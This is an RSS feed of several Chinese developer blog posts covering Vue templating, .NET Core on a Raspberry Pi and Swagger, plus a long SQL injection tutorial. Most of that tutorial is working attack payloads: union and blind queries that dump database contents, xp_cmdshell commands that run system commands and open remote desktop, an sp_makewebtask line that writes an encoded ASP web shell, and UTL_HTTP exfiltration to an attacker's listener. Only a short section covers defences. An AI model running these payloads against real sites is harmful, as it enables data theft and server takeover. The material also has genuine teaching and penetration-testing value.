<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>vue 使用Jade模板写html，stylus写css - taoquns</title>
<link>http://www.cnblogs.com/taoquns/p/8460480.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/taoquns/p/8460480.html</guid>
<description>&lt;h4 id=&quot;vue-使用jade模板写htmlstylus写css&quot;&gt;vue 使用Jade模板写html，stylus写css&lt;/h4&gt;
&lt;p&gt;日常工作都是使用vue开发页面和webApp,写的多了就想偷懒简化各种书写方式，所以使用了jade写html，stylus写css，省了很多的步骤和提高了效率。&lt;/p&gt;
&lt;h6 id=&quot;安装包&quot;&gt;安装包&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;// 安装jade包
npm install jade jade-loader --save-dev
// 如果使用vue-cli构建项目，则不需要安装stylus相关的包，vue-cli默认已安装
npm install stylus stylus-loader --save-dev&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;配置文件&quot;&gt;配置文件&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;// webpack.base.conf.js 配置
// jade
{
    test : /\.jade$/,
    loader : 'jade-loader',
}
// stylus 如果使用vue-cli构建，无需配置此项
{
    test : /\.styl$/,
    loader : 'stylus-loader',
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;jade使用前后对比&quot;&gt;jade使用前后对比&lt;/h5&gt;
&lt;pre&gt;
&lt;code&gt;// html 模板
&amp;lt;template&amp;gt;
    &amp;lt;div class='demo-components'&amp;gt;
        &amp;lt;h2&amp;gt;测试标题&amp;lt;/h2&amp;gt;
        &amp;lt;p&amp;gt;
            &amp;lt;span class='text'&amp;gt;这是一条测试的demo文本&amp;lt;/span&amp;gt;
            &amp;lt;i class='icon'&amp;gt;&amp;lt;/i&amp;gt;
        &amp;lt;/p&amp;gt;
        &amp;lt;input v-model='value1' @keydown.enter='loginIn'&amp;gt;
        &amp;lt;p&amp;gt;{{ oneText + &quot;-&quot; + &quot;twoText&quot; }}&amp;lt;/p&amp;gt;
    &amp;lt;/div&amp;gt;
&amp;lt;/template&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;// jade 模板
&amp;lt;template lang='jade'&amp;gt;
    div.demo-components
        h2 测试标题
        p
            span.text 这是一条测试的demo文本
            i.icon
        input(v-model='value1',@keydown.enter='loginIn')
        p {{ oneText + &quot;-&quot; + twoText }}
&amp;lt;/template&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;使用jade注意事项&quot;&gt;使用Jade注意事项&lt;/h6&gt;
&lt;ul&gt;&lt;li&gt;需要简单了解jade基本使用语法（10分钟简单了解即可）&lt;/li&gt;
&lt;li&gt;template 需要加上&lt;code&gt;lang='jade'&lt;/code&gt;属性&lt;/li&gt;
&lt;li&gt;标签内文本换行会解析错误，需要使用其他技巧性方法解决。例：&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;template lang='jade'&amp;gt;
    div
        p 我是测试文本哇,可是文本太长需要换行啊，我恰巧回车试一
          下啊，啊呀，报错啦！！
&amp;lt;/template&amp;gt;
// 可以写进一个变量里、或方法中返回数据、或保持一行不换行&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;stylus-前后对比&quot;&gt;stylus 前后对比&lt;/h6&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;style lang='css'&amp;gt; // css less sass scss 样式demo此处省略 

// stylus demo
&amp;lt;style lang='stylus'&amp;gt;
    .main-body
        width 300px
        heihgt 200px
        background-color rgba(0,0,0,1)
        .main-model
            width 50px
            height 50px
            margin 20px auto
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;stylus 可以使用极简的方式写css，也可以格式混合(为了保持格式统一，不建议)，将解析的任务交给webpack去做，我们只需要书写简单易读的代码即可。这是我喜欢的风格和方式，sass当然也可以做到，只是个人的机缘巧合现在使用了stylus。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;写下本文做个人记录，也给其他人做个参考。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Thu, 22 Feb 2018 15:09:00 +0000</pubDate>
<dc:creator>taoquns</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/taoquns/p/8460480.html</dc:identifier>
</item>
<item>
<title>树莓派3B上部署运行.net core 2程序 - 火冰·瓶</title>
<link>http://www.cnblogs.com/fireicesion/p/8460355.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fireicesion/p/8460355.html</guid>
<description>&lt;p&gt;针对Linxu arm处理器如何部署.net core 2的资料很少，网上找到几篇但都写得不够详细，按照他们教程来撞墙了，折磨了几天终于部署成功了，先上一张运行成功的图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222222848769-1329448100.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;1.windows系统中，在项目的目录下使用CMD命令运行进行发布&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;    dotnet publish -r linux-arm&lt;/p&gt;
&lt;p&gt;   &lt;em&gt;说明：-r表示运行平台，可以是win-arm、linux-arm、win-x86、win-x64等等。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222224136611-307673503.png&quot; alt=&quot;&quot;/&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;2.在项目的目录中会生成bin\Debug\netcoreapp2.0\linux-arm 文件，把linux-arm文件夹下的publish文件夹的内容全部复制到树莓派上&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222225220224-2016508835.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt; 3.登录树莓派，进入刚才复制的文件夹目录，对刚才复制的项目授权755或777&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  #&amp;gt;chmod 777 ./StudyTwo&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;   &lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222225523721-125473987.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后执行&lt;/p&gt;
&lt;p&gt;#&amp;gt;./StudyTwo&lt;/p&gt;
&lt;p&gt;, 这个时候环境没配好肯定会报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222225709460-603792405.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;4.接下来在树莓派上配置.net core 2的运行环境    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4.1更新系统&lt;/p&gt;
&lt;p&gt;#&amp;gt; sudo apt update &amp;amp;&amp;amp; sudo apt upgrade &lt;/p&gt;
&lt;p&gt;4.2安装依赖项&lt;/p&gt;
&lt;p&gt;#&amp;gt;sudo apt install curl libunwind8 gettext&lt;/p&gt;
&lt;p&gt;4.3下载最新版本的armhf版本dotNet runtime，最新版的地址：https://github.com/dotnet/core-setup&lt;/p&gt;
&lt;p&gt;#&amp;gt;wget https://dotnetcli.blob.core.windows.net/dotnet/Runtime/master/dotnet-runtime-latest-linux-arm.tar.gz&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222230418125-165301534.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;4.4建立dotnet文件夹在opt目录 解压runtime文件到此文件夹&lt;/p&gt;
&lt;p&gt;#&amp;gt;sudo mkdir -p /opt/dotnet &amp;amp;&amp;amp; sudo tar zxf dotnet-runtime-latest-linux-arm.tar.gz -C /opt/dotnet&lt;/p&gt;
&lt;p&gt;4.5建立快捷方式到local bin&lt;/p&gt;
&lt;p&gt;#&amp;gt; sudo ln -s /opt/dotnet/dotnet /usr/local/bin&lt;/p&gt;

&lt;p&gt;&lt;span&gt;5.最后再回到.net项目目录运行 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;#&amp;gt;./StudyTwo&lt;/p&gt;
&lt;p&gt;显示结果，成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/146777/201802/146777-20180222230948792-545493676.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Thu, 22 Feb 2018 14:29:00 +0000</pubDate>
<dc:creator>火冰&amp;#183;瓶</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fireicesion/p/8460355.html</dc:identifier>
</item>
<item>
<title>SQL注入详解 - 飞天小子</title>
<link>http://www.cnblogs.com/Zfc-Cjk/p/8460101.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Zfc-Cjk/p/8460101.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;1：什么是SQL注入&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;SQL注入是一种将SQL代码插入或添加到应用(用户)的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。&lt;/p&gt;
&lt;p&gt; www.xx.com/news.php?id=1&lt;br/&gt; www.xx.com/news.php?id=1 and 1=1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这里我们来理解一下SQL注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先，SQL注入常年蝉联OWASP排行榜第一名~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222201624698-1944728587.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL注入产生的过程是怎样的呢？见下图&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222201801162-1008133886.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SQL注入的危害有哪些呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　数据库信息泄露&lt;br/&gt;　　网页篡改&lt;br/&gt;　　网站被挂马&lt;br/&gt;　　数据库被恶意操作&lt;br/&gt;　　服务器被远程控制&lt;br/&gt;　　破坏硬盘数据。。。。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2 我们来学习一下sql注入的方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222202118098-498160370.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.1取消友好HTTP错误消息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一般通过远程测试判断是否存在SQL注入，所以通常没有机会通过查看源代码来复查注入的查询结构。这导致经常需要通过推理来进行大量测试&lt;/p&gt;
&lt;p&gt; 　　打开IE浏览器，选择菜单“工具”-&amp;gt;“Internet选项”对话框。&lt;br/&gt; 　　打开“高级”选项卡，在设置列表中找到“浏览”组，&lt;br/&gt; 　　取消勾选”显示友好HTTP错误信息”复选框 。如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222202307537-722757131.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.2寻找SQL注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最常用的SQL注入判断方法，在网站中寻找如下形式的网页&lt;br/&gt; 　　www.chinaliancheng.com/*.asp?id=1&lt;br/&gt;　　 www.chinaliancheng.com/*.aspx?id=1&lt;br/&gt;　　 www.chinaliancheng.com/*.php?id=1&lt;br/&gt; 　　www.chinaliancheng.com/*.jsp?id=1&lt;br/&gt;单引号法&lt;br/&gt; 　　提交单引号，面返回错误&lt;br/&gt; 　　and 1=1 and 1=2&lt;br/&gt;　　提交and 1=1 页面返回正常 ，提交and 1=2 页面返回错误&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.3确认注入点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区分数字和字符串&lt;br/&gt;　　 数字型&lt;br/&gt;　　 SELECT *FROM user WHERE id=1&lt;br/&gt;　　 SELECT * FROM user WHERE id &amp;gt; 1&lt;br/&gt;　　 带引号类型的&lt;br/&gt;　　 SELECT * FROM user WHERE name = ‘admin’&lt;br/&gt;　　 SELECT * FROM user WHERE date &amp;gt; ‘2017-5-3’&lt;/p&gt;
&lt;p&gt;内联SQL注入：内联注入是指插入查询注入SQL代码后，原来的查询仍然会全部执行。&lt;/p&gt;
&lt;p&gt;终止式SQL注入：终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句&lt;em id=&quot;__mceDel&quot;&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3：识别数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222203026057-984005676.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222203048080-16992243.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.1：数据库连接运算符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222203150123-1535958272.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;www.xx.com/news.php?uid=admin&lt;br/&gt;www.xx.com/news.php?uid=ad’+’min&lt;br/&gt;www.xx.com/news.php?uid=ad’’min&lt;br/&gt;www.xx.com/news.php?uid=ad||min&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3.2 Access数据库注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;利用内置数据库表获取数据库类型&lt;/p&gt;
&lt;p&gt;and (select count(*) from sysobjects)&amp;gt;=0&lt;br/&gt;　　Sysobjects为Mssql数据库内置表&lt;br/&gt;and (select count(*) from msysobjects)&amp;gt;=0&lt;br/&gt;　　Msysobjects为Access数据库内置表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Access&lt;/strong&gt;手工注入猜解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;猜表名&lt;br/&gt;　　 and exists(select * from 表名)&lt;br/&gt; 　　and(select count(*) from 表名)&amp;gt;=0&lt;/p&gt;
&lt;p&gt;猜字段名&lt;br/&gt;　　 and exists(select 字段名 from 表名)&lt;br/&gt;　　 and (select count(字段名) from 表名)&amp;gt;=0&lt;br/&gt;猜字段长度&lt;br/&gt;　　 and (select top 1 len(字段名) from 表名)&amp;gt;1&lt;br/&gt;　　 and (select top 1 len(字段名) from 表名)&amp;gt;2&lt;br/&gt;　　 and (select top 1 len(字段名) from 表名)&amp;gt;n&lt;/p&gt;
&lt;p&gt;猜字段值&lt;br/&gt;　　and (select top 1 asc(mid (字段名,1,1)) from 表名)&amp;gt;0&lt;br/&gt;　　and (select top 1 asc(mid (字段名,1,1)) from 表名)&amp;gt;1&lt;br/&gt;　　and (select top 1 asc(mid (字段名,1,1)) from 表名)&amp;gt;n&lt;br/&gt;　　and (select top 1 asc(mid (字段名,2,1)) from 表名)&amp;gt;0&lt;br/&gt;　　and (select top 1 asc(mid (字段名,2,1)) from 表名)&amp;gt;2&lt;br/&gt;　　and (select top 1 asc(mid (字段名,2,1)) from 表名)&amp;gt;n&lt;/p&gt;
&lt;p&gt;Order by 猜字段数目&lt;/p&gt;
&lt;p&gt;　　Order by 1&lt;br/&gt;　　Order by 2&lt;br/&gt;　　Order by n&lt;/p&gt;
&lt;p&gt;Union select 获取段内容&lt;br/&gt;　　Union select 1,字段名，2,…,n from 表名&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;3.3 Mssql数据库注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在进行MsSQL注入攻击时，首先要对MsSQL注入点进行一下基本的注入检查，以确定后面的攻击实施方案。&lt;/p&gt;&lt;p&gt;注入点类型的判断&lt;br/&gt;　　 and exists (select * from sysobjects)&lt;br/&gt;注入点权限判断&lt;br/&gt;　　 and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员&lt;br/&gt;　　 and 1=(select IS_SRVROLEMEMBER('db_owner')) //判断是否是库权限&lt;br/&gt;　　 and 1=(select IS_SRVROLEMEMBER('public')) //判断是否为public权限&lt;/p&gt;
&lt;p&gt;返回信息判断&lt;br/&gt;　　 and @@version&amp;gt;0 //数据库信息&lt;br/&gt;　　 ;declare @d int //判断MsSQL支持多行语句查询&lt;br/&gt;　　 and (select count(1) from [sysobjects])&amp;gt;=0 //是否支持子查询&lt;br/&gt;　　 and user&amp;gt;0 //获取当前数据库用户名&lt;br/&gt;　　 and 1=convert(int,db_name()) 或 1=(select db_name()) //当前数据库名&lt;br/&gt;　　 and 1=(select @@servername) //本地服务名&lt;br/&gt;　　 and 1=(select HAS_DBACCESS('master')) //判断是否有库读取权限&lt;/p&gt;
&lt;p&gt;检查扩展存储&lt;br/&gt;　　 检查xp_cmdshell扩展存储&lt;br/&gt;　　 and 1=(select count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name = 'xp_cmdshell')&lt;br/&gt;　　 检查xp_regread扩展存储&lt;br/&gt;　　 and 1=(select count(*) FROM master.dbo.sysobjects where name = 'xp_regread')&lt;/p&gt;
&lt;p&gt;恢复扩展存储&lt;br/&gt;　　 删除xp_cmdshell&lt;br/&gt;　　 exec master..sp_dropextendedproc'xp_cmdshell'&lt;br/&gt;　　 创建xp_cmdshell&lt;br/&gt;　　 exec master..sp_addextendedprocxp_cmdshell,'xplog70.dll‘&lt;br/&gt;　　 该语句利用系统中默认的“xplog70.dll”文件，自动恢复xp_cmdshell。&lt;br/&gt;　　 如果xplog70.dll被删除或改名，可以自定义路径进行恢复:&lt;br/&gt;　　 exec master..sp_addextendedproc'xp_cmdshell','c:\xplog70.dll'&lt;/p&gt;
&lt;p&gt;Sa权限下扩展存储攻击利用方法&lt;br/&gt;　　 Xp_cmdshell扩展执行任意命令&lt;br/&gt;　　 执行任意命令&lt;br/&gt;　　 ;exec master..xp_cmdshell 'dir c:\‘&lt;br/&gt;　　 开启3389&lt;br/&gt;　　  exec master..xp_cmdshell 'sc config termservice start=auto‘&lt;br/&gt;　　  exec master..xp_cmdshell 'net start termservice'&lt;br/&gt;　　  exec master..xp_cmdshell 'reg add&lt;br/&gt;&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v&lt;br/&gt;fDenyTSConnections /t REG_DWORD /d 0x0 /f'&lt;/p&gt;
&lt;p&gt;利用sp_makewebtash写入一句话木马&lt;br/&gt;　　 exec sp_makewebtask&lt;br/&gt;'c:\inetpub\wwwroot\c.asp','select''%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%&lt;br/&gt;63%68%6F%70%70%65%72%22%29%25%3E'''&lt;/p&gt;
&lt;p&gt;Dbowner权限下的扩展攻击利用&lt;br/&gt;　　 判断数据库用户权限&lt;br/&gt;　　 and 1=(select is_member('db_owner'));&lt;br/&gt;　　 搜索Web目录&lt;br/&gt;　　 创建一个临时表&lt;br/&gt;　　 create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULLIDENTITY(1,1));&lt;br/&gt;　　 利用xp_dirtree扩展查询&lt;br/&gt;　　 insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1&lt;br/&gt;　　 查询表中的内容&lt;br/&gt;　　 and(select dir from temp where id=1)&amp;gt;0&lt;/p&gt;
&lt;p&gt;查询暴库的另一种方法&lt;br/&gt;　　 暴字段名和字段值&lt;br/&gt;　　 增加数字n的值，就可以得到表中所有字段&lt;br/&gt;　　 and (select col_name(object_id(‘表名'),n))=0&lt;br/&gt;　　 获取字段内容&lt;br/&gt;　　 and (select top 1 字段名 from 表名)&amp;gt;0&lt;br/&gt;　　 爆其他字段值&lt;br/&gt;　　 and (select top 1 字段名 from 表名 where 字段名&amp;lt;&amp;gt;字段值1)&amp;gt;0&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;3.4 Oracle数据库注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Oracle注入点判断&lt;br/&gt;　　 and 1=1 and 1=2&lt;br/&gt;　　 /*&lt;br/&gt;　　 --&lt;br/&gt;　　 ;&lt;br/&gt;　　 and exists(select * from dual)&lt;br/&gt;　　 and exists(select count(*) from user_tables)&amp;gt;0&lt;/p&gt;
&lt;p&gt;注入点信息判断&lt;br/&gt;　　 确定注入点类型后，与前面的MySQL注入一样，先用order by 猜出字段数目，再用联合查询union select方法获取想要的信息。&lt;br/&gt;获取数据库版本信息&lt;br/&gt;　　 and 1=2 union select null,null,(select banner from sys.v_$version where rownum=1) from dual&lt;br/&gt;获取当前数据库连接用户名&lt;br/&gt;　　 and 1=2 union select null,null,(select SYS_CONTEXT ('USERENV','CURRENT_USER') fromdual) from dual&lt;br/&gt;获取系统平台&lt;br/&gt;　　 and 1=2 union select null,null,(select member from v$logfile where rownum=1) from dual&lt;br/&gt;获取服务器SID&lt;br/&gt;　　 and 1=2 union select null,null,(select instance_namefrom v$instance) from dual&lt;/p&gt;
&lt;p&gt;爆库名&lt;br/&gt;　　 and 1=2 union select null,null,(select owner from all_tables where rownum=1) from dual&lt;br/&gt;爆出第一个库名后可以使用如下语句，继续爆其他库名&lt;br/&gt;　　 and 1=2 union select null,null,(select owner from all_table where rownum=1 and owner&amp;lt;&amp;gt;'第一个库名') from dual&lt;br/&gt;获取表名&lt;br/&gt;　　 and 1=2 union select null,null,(select table_name from user_tables where rownum=1) from dual&lt;br/&gt;爆其他表名&lt;br/&gt;　　 and 1=2 union select null,null,(select table_name from user_tables where rownum=1 and table_name&amp;lt;&amp;gt;'第一个表名') from dual&lt;br/&gt;注意:表名要用大写或大写的十六进制代码。&lt;/p&gt;
&lt;p&gt;获取字段名&lt;br/&gt;　　and 1=2 union select null,null,(select column_name from user_tab_columns where table_name='表名' and rownum=1) from dual&lt;br/&gt;获取其他字段名&lt;br/&gt;　　 and 1=2 union select null,null,(select column_name from user_tab_columns where table_name='表名' and column_name&amp;lt;&amp;gt;'第一个字段' and rownum=1) from dual&lt;br/&gt; 获取字段内容&lt;br/&gt;　　 and 1=2 union select null,null,字段名 from 表名&lt;/p&gt;
&lt;p&gt;判断UTL_HTTP存储过程是否可用&lt;br/&gt;　　 and exists(select count(*) from all_objectswhere object_name='UTL_HTTP')&lt;br/&gt;监听本地端口&lt;br/&gt;　　 nc –vv –l –p 8888&lt;br/&gt;　　 UTL_HTTP反弹注入&lt;br/&gt;　　 and UTL_HTTP.request('http://IP:端口号/'||(查询语句))=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222205122250-1339888040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;4 注入工具介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222205202249-560614118.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5 防御sql注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/946454/201802/946454-20180222205233240-542606079.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 使用参数化查询&lt;/p&gt;
&lt;p&gt;PHP包含很多用于访问数据库的框架。访问MySQL数据库的mysqli包，PEAR::MDB2包(它替代了流行的PEAR::DB包)以及新的PHP数据对象(PDO)框架，他们均为使用参数化语句提供便利。&lt;/p&gt;
&lt;p&gt;输入验证&lt;/p&gt;
&lt;p&gt;验证应用接收到的输入时一种可用的功能强大的控制手段(如果用的好的话)。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;白名单&lt;br/&gt;　　 使用白名单应该开了下列要点:&lt;br/&gt;　　 数据类型:字符、数字等；&lt;br/&gt;　　 数据大小:字符串长度是否正确，数字的大小和精度是否正确。&lt;br/&gt;　　 数据范围:如果 是数字型，是否位于该数据类型期望的数字范围。&lt;br/&gt;　　 数据内容:数据是否属于期望的数据类型，如手机号码，它是否瞒住期望的值。&lt;br/&gt;黑名单&lt;br/&gt;　　 黑名单验证的常用方法也是使用正则表达式。&lt;/p&gt;

&lt;p&gt;编码输入与使用存储过程防御&lt;/p&gt;
&lt;p&gt;除了验证应用受到的输入以外，通常还需要对在应用的不同模块或部分传递的内容进行编码。&lt;/p&gt;
&lt;p&gt;通常会被忽视的情况是对来自数据库的信息进行编码，尤其是当正在使用的数据库未经过严格验证或审查，或者来自第三方数据源时。&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;将应用设计成专门使用存储过程来访问数据库是一种可以放置或减轻SQL注入影响的技术。存储&lt;br/&gt;过程是保存在数据库汇总的程序。根据数据库的不同，可以使用很多不同语言及其变体来编写存储过程&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 13:01:00 +0000</pubDate>
<dc:creator>飞天小子</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Zfc-Cjk/p/8460101.html</dc:identifier>
</item>
<item>
<title>.NET Core使用swagger进行API接口文档管理 - OMango</title>
<link>http://www.cnblogs.com/OMango/p/8460092.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/OMango/p/8460092.html</guid>
<description>&lt;p&gt;&lt;strong&gt;一、问题背景&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　随着技术的发展，现在的开发模式已经更多的转向了前后端分离的模式，在前后端开发的过程中，联系的方式也变成了API接口，但是目前项目中对于API的管理很多时候还是通过手工编写文档，每次的需求变更只要涉及到接口的变更，文档都需要进行额外的维护，如果有哪个小伙伴忘记维护，很多时候就会造成一连续的问题，那如何可以更方便的解决API的沟通问题？Swagger给我们提供了一个方式，由于目前主要我是投入在.NET Core项目的开发中，所以以.NET Core作为示例&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、什么是Swagger&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　Swagger可以从不同的代码中，根据注释生成API信息，swagger拥有强大的社区，并且对于各种语言都支持良好，有很多的工具可以通过swagger生成的文件生成API文档&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、.NET Core中使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　.NET Core中使用首先要用nuget引用&lt;a href=&quot;https://github.com/domaindrivendev/Swashbuckle.AspNetCore&quot; target=&quot;_blank&quot;&gt;Swashbuckle.AspNetCore&lt;/a&gt;，在startup.cs中加入如下代码&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method gets called by the runtime. Use this method to add services to the container.&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.AddMvc();
            services.AddSwaggerGen(c &lt;/span&gt;=&amp;gt;&lt;span&gt;
            {
                c.SwaggerDoc(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; Info { Title = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, Version = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; });
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; basePath =&lt;span&gt; PlatformServices.Default.Application.ApplicationBasePath;
